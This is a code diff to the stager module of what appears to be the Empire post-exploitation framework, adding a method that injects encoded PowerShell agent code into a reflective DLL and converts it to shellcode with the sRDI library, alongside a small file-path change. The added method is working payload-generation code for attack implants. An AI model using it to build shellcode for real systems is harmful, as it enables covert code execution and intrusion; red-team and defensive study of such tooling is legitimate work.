@@ -17,6 +17,7 @@ The Stagers() class in instantiated in ./empire.py by the main menu and includes
 import fnmatch
 import imp
 import helpers
+import errno
 import os
 import errno
 import macholib.MachO
@@ -24,6 +25,7 @@ import shutil
 import zipfile
 import subprocess
 from itertools import izip, cycle
+from ShellcodeRDI import *
 import base64
 
 
@@ -131,6 +133,39 @@ class Stagers:
 
         else:
             print helpers.color("[!] Original .dll for arch %s does not exist!" % (arch))
+
+    def generate_shellcode(self, poshCode, arch):
+        """
+        Generate shellcode using monogas's sRDI python module and the PowerPick reflective DLL
+        """
+        if arch.lower() == 'x86':
+            origPath = "{}/data/misc/x86_slim.dll".format(self.mainMenu.installPath)
+        else:
+            origPath = "{}/data/misc/x64_slim.dll".format(self.mainMenu.installPath)
+
+        if os.path.isfile(origPath):
+
+            dllRaw = ''
+            with open(origPath, 'rb') as f:
+                dllRaw = f.read() 
+
+                replacementCode = helpers.decode_base64(poshCode)
+
+                # patch the dll with the new PowerShell code
+                searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
+                index = dllRaw.find(searchString)
+                dllPatched = dllRaw[:index]+replacementCode+dllRaw[(index+len(replacementCode)):]
+
+                flags = 0
+                flags |= 0x1
+                
+                sc = ConvertToShellcode(dllPatched, flags=flags)
+
+                return sc 
+        
+        else:
+            print helpers.color("[!] Original .dll for arch {} does not exist!".format(arch))
+                
 
 
     def generate_macho(self, launcherCode):
@@ -452,8 +487,8 @@ class Stagers:
                 raise
             else:
                 pass
-
-        file = open(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java','w')
+        
+        file = open(jarpath+'Run.java','w')
         file.write(javacode)
         file.close()
         currdir = os.getcwd()
